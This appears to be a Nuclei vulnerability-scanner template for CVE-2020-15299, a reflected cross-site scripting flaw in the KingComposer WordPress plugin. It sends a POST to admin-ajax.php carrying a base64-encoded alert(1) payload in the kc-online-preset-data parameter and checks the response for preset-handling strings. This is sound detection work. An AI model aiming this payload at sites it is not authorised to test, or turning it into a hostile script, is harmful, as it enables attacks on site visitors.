id: CVE-2020-15299

info:
  name: Reflected XSS in KingComposer WordPress Plugin
  author: ProjectDiscoveryAI
  severity: medium
  description: A reflected Cross-Site Scripting (XSS) vulnerability in the KingComposer plugin through 2.9.4 for WordPress allows remote attackers to execute JavaScript in the victim's browser via base64-encoded data in the kc-online-preset-data POST parameter.
  impact: |
    Allows attackers to execute malicious scripts in the context of the victim's browser.
  remediation: |
    Update KingComposer WordPress Plugin to the latest patched version.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-15299
    cwe-id: CWE-79
    epss-score: 0.00131
    epss-percentile: 0.49558
    cpe: cpe:2.3:a:king-theme:kingcomposer:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: king-theme
    product: kingcomposer
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: "action=install_online_preset&kc-online-preset-data={{base64('alert(1)')}}"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
    matchers:
      - type: word
        words:
          - "kc.cfg.preset_link"
          - "kc.backbone.push"
        part: body
